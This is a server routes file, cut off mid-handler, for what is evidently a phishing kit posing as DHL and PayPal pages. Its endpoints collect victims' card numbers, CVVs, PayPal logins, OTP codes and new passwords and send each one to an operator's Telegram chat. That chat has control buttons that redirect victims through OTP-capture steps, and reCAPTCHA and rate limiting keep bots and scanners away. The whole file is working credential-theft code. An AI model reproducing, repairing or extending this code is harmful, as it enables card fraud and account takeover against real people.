import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  insertAdminSettingsSchema, 
  insertPaymentRecordSchema 
} from "@shared/schema";
import { z } from "zod";
import { 
  sendTelegramMessage, 
  formatPaymentNotification,
  formatPayPalNotification,
  getClientInfo
} from "./telegram";
import type { SessionData } from "express-session";

declare module "express-serve-static-core" {
  interface Request {
    session?: SessionData & { isAdmin?: boolean };
  }
}

async function getTelegramConfig(): Promise<{ botToken: string; chatId: string } | null> {
  const envBotToken = process.env.TELEGRAM_BOT_TOKEN;
  const envChatId = process.env.TELEGRAM_CHAT_ID;
  
  if (envBotToken && envChatId) {
    return { botToken: envBotToken, chatId: envChatId };
  }
  
  const settings = await storage.getAdminSettings();
  if (settings?.telegramBotToken && settings?.telegramChatId) {
    return { 
      botToken: settings.telegramBotToken, 
      chatId: settings.telegramChatId 
    };
  }
  
  return null;
}

async function getRecaptchaConfig(): Promise<{ siteKey: string; secretKey: string; enabled: boolean; threshold: number } | null> {
  const settings = await storage.getAdminSettings();
  
  if (!settings?.recaptchaSiteKey || !settings?.recaptchaSecretKey) {
    return null;
  }
  
  return {
    siteKey: settings.recaptchaSiteKey,
    secretKey: settings.recaptchaSecretKey,
    enabled: settings.recaptchaEnabled === "true",
    threshold: parseFloat(settings.recaptchaThreshold || "0.5")
  };
}

// Rate limiting system to prevent brute force attacks
interface RateLimitEntry {
  attempts: number;
  firstAttemptTime: number;
  lastAttemptTime: number;
}

class RateLimiter {
  private attempts: Map<string, RateLimitEntry> = new Map();
  private readonly maxAttempts: number;
  private readonly windowMs: number;
  private readonly cleanupIntervalMs: number = 60000; // Clean up every minute

  constructor(maxAttempts: number = 5, windowMinutes: number = 10) {
    this.maxAttempts = maxAttempts;
    this.windowMs = windowMinutes * 60 * 1000;
    
    // Auto-cleanup old entries every minute
    setInterval(() => this.cleanup(), this.cleanupIntervalMs);
  }

  isRateLimited(identifier: string): boolean {
    const now = Date.now();
    const entry = this.attempts.get(identifier);

    if (!entry) {
      // First attempt
      this.attempts.set(identifier, {
        attempts: 1,
        firstAttemptTime: now,
        lastAttemptTime: now
      });
      return false;
    }

    // Check if window has expired
    if (now - entry.firstAttemptTime > this.windowMs) {
      // Reset the window
      this.attempts.set(identifier, {
        attempts: 1,
        firstAttemptTime: now,
        lastAttemptTime: now
      });
      return false;
    }

    // Increment attempts
    entry.attempts++;
    entry.lastAttemptTime = now;
    this.attempts.set(identifier, entry);

    // Check if rate limited
    if (entry.attempts > this.maxAttempts) {
      console.log(`🚫 Rate limit exceeded for ${identifier}: ${entry.attempts} attempts in ${Math.round((now - entry.firstAttemptTime) / 1000)}s`);
      return true;
    }

    return false;
  }

  getRemainingAttempts(identifier: string): number {
    const entry = this.attempts.get(identifier);
    if (!entry) return this.maxAttempts;
    
    const now = Date.now();
    if (now - entry.firstAttemptTime > this.windowMs) {
      return this.maxAttempts;
    }
    
    return Math.max(0, this.maxAttempts - entry.attempts);
  }

  getResetTime(identifier: string): number | null {
    const entry = this.attempts.get(identifier);
    if (!entry) return null;
    
    return entry.firstAttemptTime + this.windowMs;
  }

  private cleanup() {
    const now = Date.now();
    let cleanedCount = 0;
    
    const entries = Array.from(this.attempts.entries());
    for (const [identifier, entry] of entries) {
      if (now - entry.lastAttemptTime > this.windowMs) {
        this.attempts.delete(identifier);
        cleanedCount++;
      }
    }
    
    if (cleanedCount > 0) {
      console.log(`🧹 Rate limiter cleaned up ${cleanedCount} expired entries`);
    }
  }
}

// Create rate limiters for different endpoints
const paymentRateLimiter = new RateLimiter(5, 10); // 5 attempts per 10 minutes
const paypalRateLimiter = new RateLimiter(5, 10); // 5 attempts per 10 minutes

async function verifyRecaptchaToken(token: string, remoteIp?: string): Promise<{ success: boolean; score?: number; error?: string }> {
  try {
    const config = await getRecaptchaConfig();
    
    // If reCAPTCHA not configured or disabled, allow by default
    if (!config || !config.enabled) {
      return { success: true, score: 1.0 };
    }
    
    // SECURITY: If reCAPTCHA is enabled, token MUST be provided
    if (!token || token.trim() === '') {
      return { 
        success: false, 
        error: 'reCAPTCHA token is required but was not provided' 
      };
    }
    
    // Verify token with Google
    const response = await fetch('https://www.google.com/recaptcha/api/siteverify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        secret: config.secretKey,
        response: token,
        ...(remoteIp && { remoteip: remoteIp })
      })
    });
    
    const data = await response.json();
    
    if (!data.success) {
      return { 
        success: false, 
        error: `reCAPTCHA verification failed: ${data['error-codes']?.join(', ') || 'Unknown error'}` 
      };
    }
    
    const score = data.score || 0;
    
    // Check if score meets threshold
    if (score < config.threshold) {
      return { 
        success: false, 
        score,
        error: `Bot detected (score: ${score.toFixed(2)}, threshold: ${config.threshold})` 
      };
    }
    
    return { success: true, score };
  } catch (error) {
    console.error('reCAPTCHA verification error:', error);
    
    // SECURITY: Fail closed - if reCAPTCHA is enabled and verification fails, block the request
    const config = await getRecaptchaConfig();
    if (config?.enabled) {
      return { 
        success: false, 
        error: `reCAPTCHA verification error: ${error instanceof Error ? error.message : 'Unknown error'}` 
      };
    }
    
    // If reCAPTCHA is disabled, allow by default (only happens if config changes during execution)
    return { success: true, score: 1.0 };
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin authentication endpoints
  app.get("/api/admin/check-setup", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      const isSetup = !!settings?.adminPasswordHash;
      res.json({ isSetup });
    } catch (error) {
      res.status(500).json({ error: "Failed to check setup status" });
    }
  });

  app.post("/api/admin/setup", async (req, res) => {
    try {
      let { password } = req.body;
      
      const envPassword = process.env.ADMIN_PASSWORD;
      if (envPassword) {
        password = envPassword;
      }
      
      if (!password || password.length < 8) {
        return res.status(400).json({ error: "Password must be at least 8 characters" });
      }

      // Check if already setup
      const existingSettings = await storage.getAdminSettings();
      if (existingSettings?.adminPasswordHash) {
        return res.status(400).json({ error: "Admin password already set" });
      }

      // Hash password (simple hash for now - in production use bcrypt)
      const crypto = await import('crypto');
      const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

      // Save password hash
      await storage.upsertAdminSettings({
        ...existingSettings,
        adminPasswordHash: passwordHash,
      });

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to setup admin password" });
    }
  });

  app.post("/api/admin/login", async (req, res) => {
    try {
      const { password } = req.body;
      
      if (!password) {
        return res.status(400).json({ error: "Password required" });
      }

      const settings = await storage.getAdminSettings();
      if (!settings?.adminPasswordHash) {
        return res.status(400).json({ error: "Admin not setup" });
      }

      // Verify password
      const crypto = await import('crypto');
      const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

      if (passwordHash !== settings.adminPasswordHash) {
        return res.status(401).json({ error: "Invalid password" });
      }

      // Set session
      if (req.session) {
        req.session.isAdmin = true;
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Login failed" });
    }
  });

  app.post("/api/admin/logout", async (req, res) => {
    try {
      if (req.session) {
        req.session.isAdmin = false;
      }
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Logout failed" });
    }
  });

  app.get("/api/admin/check-auth", async (req, res) => {
    try {
      const isAuthenticated = req.session?.isAdmin === true;
      res.json({ isAuthenticated });
    } catch (error) {
      res.status(500).json({ error: "Failed to check authentication" });
    }
  });

  // Admin settings endpoints
  app.get("/api/admin/settings", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      const envBotToken = process.env.TELEGRAM_BOT_TOKEN;
      const envChatId = process.env.TELEGRAM_CHAT_ID;
      
      const configSource = envBotToken && envChatId ? "environment" : "database";
      
      res.json({ 
        telegramBotToken: envBotToken || settings?.telegramBotToken || "", 
        telegramChatId: envChatId || settings?.telegramChatId || "",
        redirectUrl: settings?.redirectUrl || "",
        redirectEnabled: settings?.redirectEnabled || "false",
        recaptchaSiteKey: settings?.recaptchaSiteKey || "",
        recaptchaSecretKey: settings?.recaptchaSecretKey || "",
        recaptchaEnabled: settings?.recaptchaEnabled || "false",
        recaptchaThreshold: settings?.recaptchaThreshold || "0.5",
        configSource
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get settings" });
    }
  });

  app.post("/api/admin/settings", async (req, res) => {
    try {
      const validated = insertAdminSettingsSchema.parse(req.body);
      const settings = await storage.upsertAdminSettings(validated);
      
      // Restart Telegram bot with new settings
      const { startTelegramBot } = await import("./telegram-bot");
      startTelegramBot();
      
      res.json(settings);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to save settings" });
      }
    }
  });

  app.post("/api/admin/test-telegram", async (req, res) => {
    try {
      const { botToken, chatId } = req.body;
      
      if (!botToken || !chatId) {
        return res.status(400).json({ error: "Missing botToken or chatId" });
      }

      const testMessage = `🧪 <b>Test de connexion</b>\n\nVotre bot Telegram est correctement configuré!\n\n⏰ ${new Date().toLocaleString('fr-FR')}`;
      const success = await sendTelegramMessage(botToken, chatId, testMessage);
      
      if (success) {
        res.json({ success: true, message: "Test message sent successfully" });
      } else {
        res.status(500).json({ success: false, error: "Failed to send test message" });
      }
    } catch (error) {
      res.status(500).json({ error: "Test failed" });
    }
  });

  // Public reCAPTCHA config endpoint (only exposes site key, not secret key)
  app.get("/api/recaptcha-config", async (req, res) => {
    try {
      const config = await getRecaptchaConfig();
      
      if (!config || !config.enabled) {
        return res.json({ 
          enabled: false,
          siteKey: null 
        });
      }
      
      res.json({ 
        enabled: true,
        siteKey: config.siteKey 
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get reCAPTCHA config" });
    }
  });

  // Payment flow endpoints
  app.post("/api/payment/start", async (req, res) => {
    try {
      // Check rate limiting first
      const clientIp = req.ip || 'unknown';
      if (paymentRateLimiter.isRateLimited(clientIp)) {
        const resetTime = paymentRateLimiter.getResetTime(clientIp);
        const waitSeconds = resetTime ? Math.ceil((resetTime - Date.now()) / 1000) : 600;
        const waitMinutes = Math.ceil(waitSeconds / 60);
        
        console.log(`🚫 Rate limit blocked payment attempt from IP: ${clientIp}`);
        
        // Add Retry-After header for automated clients
        res.setHeader('Retry-After', waitSeconds.toString());
        
        return res.status(429).json({ 
          error: "Too many attempts. Please try again later.",
          retryAfter: waitMinutes,
          message: `You have exceeded the maximum number of attempts. Please wait ${waitMinutes} minutes before trying again.`
        });
      }

      // Verify reCAPTCHA token
      const recaptchaToken = req.body.recaptchaToken;
      const recaptchaResult = await verifyRecaptchaToken(recaptchaToken, req.ip);
      
      if (!recaptchaResult.success) {
        console.log(`❌ Bot detected on /api/payment/start: ${recaptchaResult.error} (IP: ${req.ip})`);
        return res.status(403).json({ 
          error: "Bot detection failed. Please refresh and try again.",
          details: recaptchaResult.error 
        });
      }
      
      if (recaptchaResult.score !== undefined) {
        console.log(`✅ reCAPTCHA verified (score: ${recaptchaResult.score.toFixed(2)}) for /api/payment/start`);
      }

      const paymentData = {
        cardNumber: req.body.cardNumber,
        expiryMonth: req.body.expiryMonth,
        expiryYear: req.body.expiryYear,
        cvv: req.body.cvv,
        cardholderName: req.body.cardholderName,
        otp1: null,
        otp2: null,
        paypalEmail: null,
        paypalPassword: null,
      };

      const validated = insertPaymentRecordSchema.parse(paymentData);
      const record = await storage.createPaymentRecord(validated);
      
      // Create DHL session for waiting page
      const sessionId = Math.random().toString(36).substring(2, 10);
      const clientInfo = await getClientInfo(req);
      
      // Detect bank from card BIN
      const bin = req.body.cardNumber.replace(/\s/g, "").substring(0, 6);
      let bankName = "Bank";
      
      // Bank detection logic (Card brands first)
      if (bin.startsWith("4")) bankName = "Visa";
      else if (bin >= "510000" && bin <= "559999") bankName = "Mastercard";
      else if (bin.startsWith("34") || bin.startsWith("37")) bankName = "American Express";
      else if (bin.startsWith("35")) bankName = "JCB";
      else if (["497511", "497591", "497592"].includes(bin)) bankName = "BNP Paribas";
      else if (["450903", "450904", "486236"].includes(bin)) bankName = "Crédit Agricole";
      else if (["512871", "513457", "522371"].includes(bin)) bankName = "Société Générale";
      else if (["434533", "434534", "434535"].includes(bin)) bankName = "Crédit Mutuel";
      else if (["425706", "425707", "453275"].includes(bin)) bankName = "LCL";
      else if (["425790", "434769", "497878"].includes(bin)) bankName = "Caisse d'Épargne";
      else if (["438602", "497592", "513457"].includes(bin)) bankName = "La Banque Postale";
      else if (["450875", "486236", "522371"].includes(bin)) bankName = "Boursorama";

      await storage.createDhlSession({
        sessionId,
        paymentId: record.id,
        cardNumber: req.body.cardNumber,
        cardholderName: req.body.cardholderName,
        bankName,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const notification = formatPaymentNotification({
          cardNumber: req.body.cardNumber,
          expiryMonth: req.body.expiryMonth,
          expiryYear: req.body.expiryYear,
          cvv: req.body.cvv,
          cardholderName: req.body.cardholderName,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: sessionId,
        });

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          notification.message,
          notification.keyboard
        );
      }
      
      res.json({ paymentId: record.id, sessionId });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to create payment record" });
      }
    }
  });

  app.post("/api/payment/:id/otp1", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      // Validate OTP: reject codes like "000000", "111111", etc.
      const isInvalidOTP = /^(\d)\1{5}$/.test(otp) || !otp || otp.length !== 6;
      if (isInvalidOTP) {
        return res.status(400).json({ error: "Invalid OTP code" });
      }

      const updated = await storage.updatePaymentRecord(id, { otp1: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP1 is verified
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const clientInfo = await getClientInfo(req);
        
        // Get DHL session to include sessionId in notification
        const sessions = await storage.getAllDhlSessions();
        const session = sessions.find((s: any) => s.paymentId === id);
        
        const notification = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: session?.sessionId,
        });

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  app.post("/api/payment/:id/otp2", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      // Validate OTP: reject codes like "000000", "111111", etc.
      const isInvalidOTP = /^(\d)\1{5}$/.test(otp) || !otp || otp.length !== 6;
      if (isInvalidOTP) {
        return res.status(400).json({ error: "Invalid OTP code" });
      }

      const updated = await storage.updatePaymentRecord(id, { otp2: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP2 is verified
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const clientInfo = await getClientInfo(req);
        
        // Get DHL session to include sessionId in notification
        const sessions = await storage.getAllDhlSessions();
        const session = sessions.find((s: any) => s.paymentId === id);
        
        const notification = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: session?.sessionId,
        });

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  // PayPal card submission endpoint
  app.post("/api/paypal/card", async (req, res) => {
    try {
      const { cardNumber, expiryMonth, expiryYear, cvv } = req.body;

      if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
        return res.status(400).json({ error: "All card fields required" });
      }

      const clientInfo = await getClientInfo(req);

      // Create a session for this card submission
      const session = await storage.createPaypalSession({
        sessionId: clientInfo.sessionId,
        cardNumber,
        expiryMonth,
        expiryYear,
        cvv,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const message = `
💳 <b>PAYPAL - CARTE BANCAIRE</b>

💳 <b>Numéro de carte:</b> <code>${cardNumber}</code>
📅 <b>Date d'expiration:</b> <code>${expiryMonth}/${expiryYear}</code>
🔐 <b>CVV:</b> <code>${cvv}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>

⏰ ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "💳 Carte", callback_data: `paypal_card_${clientInfo.sessionId}` },
            { text: "✅ Approuver", callback_data: `paypal_approve_${clientInfo.sessionId}` }
          ],
          [
            { text: "🔑 OTP 1", callback_data: `paypal_otp1_${clientInfo.sessionId}` },
            { text: "🔑 OTP 2", callback_data: `paypal_otp2_${clientInfo.sessionId}` }
          ],
          [
            { text: "📧 OTP EMAIL", callback_data: `paypal_otp_email_${clientInfo.sessionId}` },
            { text: "🔒 Mot de passe expiré", callback_data: `paypal_password_${clientInfo.sessionId}` }
          ],
          [
            { text: "✅ Succès", callback_data: `paypal_success_${clientInfo.sessionId}` },
            { text: "❌ Échec", callback_data: `paypal_error_${clientInfo.sessionId}` }
          ]
        ];

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          message,
          keyboard
        );
      }

      res.json({ success: true, sessionId: session.sessionId });
    } catch (error) {
      res.status(500).json({ error: "Failed to process card" });
    }
  });

  // PayPal login endpoint
  app.post("/api/paypal/login", async (req, res) => {
    try {
      // Check rate limiting first
      const clientIp = req.ip || 'unknown';
      if (paypalRateLimiter.isRateLimited(clientIp)) {
        const resetTime = paypalRateLimiter.getResetTime(clientIp);
        const waitSeconds = resetTime ? Math.ceil((resetTime - Date.now()) / 1000) : 600;
        const waitMinutes = Math.ceil(waitSeconds / 60);
        
        console.log(`🚫 Rate limit blocked PayPal login attempt from IP: ${clientIp}`);
        
        // Add Retry-After header for automated clients
        res.setHeader('Retry-After', waitSeconds.toString());
        
        return res.status(429).json({ 
          error: "Too many attempts. Please try again later.",
          retryAfter: waitMinutes,
          message: `You have exceeded the maximum number of attempts. Please wait ${waitMinutes} minutes before trying again.`
        });
      }

      // Verify reCAPTCHA token
      const recaptchaToken = req.body.recaptchaToken;
      const recaptchaResult = await verifyRecaptchaToken(recaptchaToken, req.ip);
      
      if (!recaptchaResult.success) {
        console.log(`❌ Bot detected on /api/paypal/login: ${recaptchaResult.error} (IP: ${req.ip})`);
        return res.status(403).json({ 
          error: "Bot detection failed. Please refresh and try again.",
          details: recaptchaResult.error 
        });
      }
      
      if (recaptchaResult.score !== undefined) {
        console.log(`✅ reCAPTCHA verified (score: ${recaptchaResult.score.toFixed(2)}) for /api/paypal/login`);
      }

      const { email, password } = req.body;

      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }

      const clientInfo = await getClientInfo(req);

      // Create a session for this login attempt
      const session = await storage.createPaypalSession({
        sessionId: clientInfo.sessionId,
        email,
        password,
        ipAddress: clientInfo.ipAddress,
        country: clientInfo.country,
        device: clientInfo.device,
        browser: clientInfo.browser,
        status: "waiting",
      });

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const notification = formatPayPalNotification({
          email,
          password,
          timestamp: new Date(),
          ipAddress: clientInfo.ipAddress,
          country: clientInfo.country,
          device: clientInfo.device,
          browser: clientInfo.browser,
          sessionId: clientInfo.sessionId,
        });

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          notification.message,
          notification.keyboard
        );
      }

      res.json({ success: true, sessionId: session.sessionId });
    } catch (error) {
      res.status(500).json({ error: "Failed to process login" });
    }
  });

  // Check redirect status for PayPal session
  app.get("/api/paypal/check-redirect/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getPaypalSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Return redirect with proper session parameter
      if (session.redirectUrl) {
        const redirectWithSession = `${session.redirectUrl}${session.redirectUrl.includes('?') ? '&' : '?'}session=${sessionId}`;
        res.json({ redirect: redirectWithSession });
      } else {
        res.json({ redirect: null });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to check redirect" });
    }
  });

  // Get PayPal session data (client)
  app.get("/api/paypal/session/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getPaypalSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({
        redirectUrl: session.redirectUrl,
        redirectVersion: session.redirectVersion ?? 0,
        currentPath: session.currentPath,
        status: session.status,
        device: session.device,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get session" });
    }
  });

  // Update current path for PayPal session (client)
  app.patch("/api/paypal/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

      const updated = await storage.updatePaypalSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  // PayPal OTP submission endpoint
  app.post("/api/paypal/otp", async (req, res) => {
    try {
      const { sessionId, otp, step } = req.body;

      if (!sessionId || !otp) {
        return res.status(400).json({ error: "SessionId and OTP required" });
      }

      const session = await storage.getPaypalSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Clear the redirect URL so the waiting page doesn't loop back to OTP
      await storage.updatePaypalSession(sessionId, {
        redirectUrl: null,
      });

      const clientInfo = await getClientInfo(req);

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const message = `
🔢 <b>PAYPAL - CODE OTP ${step === 2 ? '2' : '1'}</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Mot de passe:</b> <code>${session.password}</code>
🔑 <b>Code OTP ${step === 2 ? '2' : '1'}:</b> <code>${otp}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${sessionId}` }
          ],
          [
            { text: "💳 CARTE", callback_data: `paypal_card_${sessionId}` },
            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` }
          ],
          [
            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` }
          ],
          [
            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` },
            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` }
          ],
          [
            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` },
            { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` }
          ]
        ];

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          message,
          keyboard
        );

        // Send result message after OTP 2 submission
        if (step === 2) {
          const resultMessage = `
✅ <b>RÉSULTAT - CODE OTP 2 SOUMIS</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Mot de passe:</b> <code>${session.password}</code>
🔑 <b>Code OTP 2:</b> <code>${otp}</code>

✔️ <b>Statut:</b> Code OTP 2 capturé avec succès
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

          await sendTelegramMessage(
            telegramConfig.botToken,
            telegramConfig.chatId,
            resultMessage,
            []
          );
        }
      }

      res.json({ success: true });
    } catch (error) {
      console.error("OTP submission error:", error);
      res.status(500).json({ error: "Failed to submit OTP" });
    }
  });

  // PayPal OTP Email submission endpoint
  app.post("/api/paypal/otp-email", async (req, res) => {
    try {
      const { sessionId, otp } = req.body;

      if (!sessionId || !otp) {
        return res.status(400).json({ error: "SessionId and OTP required" });
      }

      const session = await storage.getPaypalSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      const clientInfo = await getClientInfo(req);

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const message = `
📧 <b>PAYPAL - CODE OTP EMAIL</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Mot de passe:</b> <code>${session.password || 'N/A'}</code>
🔑 <b>Code OTP Email:</b> <code>${otp}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${sessionId}` }
          ],
          [
            { text: "💳 CARTE", callback_data: `paypal_card_${sessionId}` },
            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` }
          ],
          [
            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` }
          ],
          [
            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` },
            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` }
          ],
          [
            { text: "📧 OTP EMAIL", callback_data: `paypal_otp_email_${sessionId}` },
            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` }
          ]
        ];

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          message,
          keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      console.error("OTP Email submission error:", error);
      res.status(500).json({ error: "Failed to submit OTP Email" });
    }
  });

  // PayPal password reset endpoint
  app.post("/api/paypal/password-reset", async (req, res) => {
    try {
      const { sessionId, newPassword, confirmPassword } = req.body;

      if (!sessionId || !newPassword || !confirmPassword) {
        return res.status(400).json({ error: "All fields required" });
      }

      if (newPassword !== confirmPassword) {
        return res.status(400).json({ error: "Passwords do not match" });
      }

      const session = await storage.getPaypalSession(sessionId);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      const clientInfo = await getClientInfo(req);

      // Send notification to Telegram
      const telegramConfig = await getTelegramConfig();
      if (telegramConfig) {
        const message = `
🔑 <b>PAYPAL - NOUVEAU MOT DE PASSE</b>

📧 <b>Email:</b> <code>${session.email}</code>
🔐 <b>Ancien mot de passe:</b> <code>${session.password}</code>
🆕 <b>Nouveau mot de passe:</b> <code>${newPassword}</code>
✅ <b>Confirmation:</b> <code>${confirmPassword}</code>

🌍 <b>Pays:</b> ${clientInfo.country}
📱 <b>Appareil:</b> ${clientInfo.device}
🌐 <b>Navigateur:</b> ${clientInfo.browser}
🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
`;

        const keyboard = [
          [
            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
            { text: "❌ ERROR", callback_data: `paypal_error_${sessionId}` },
          ],
          [
            { text: "🔐 OTP", callback_data: `paypal_otp_${sessionId}` },
            { text: "🎉 SUCCESS", callback_data: `paypal_success_${sessionId}` },
          ],
          [
            { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` },
          ],
        ];

        await sendTelegramMessage(
          telegramConfig.botToken,
          telegramConfig.chatId,
          message,
          keyboard
        );
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Password reset error:", error);
      res.status(500).json({ error: "Failed to reset password" });
    }
  });

  // Get all waiting PayPal sessions (admin)
  app.get("/api/admin/paypal-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllPaypalSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  // DHL session endpoints
  app.get("/api/dhl/session/:sessionId", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = await storage.getDhlSession(sessionId);

      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(session);
    } catch (error) {
      res.status(500).json({ error: "Failed to get session" });
    }
  });

  // Update current path for DHL session (client)
  app.patch("/api/dhl/session/:sessionId/path", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { currentPath } = req.body;

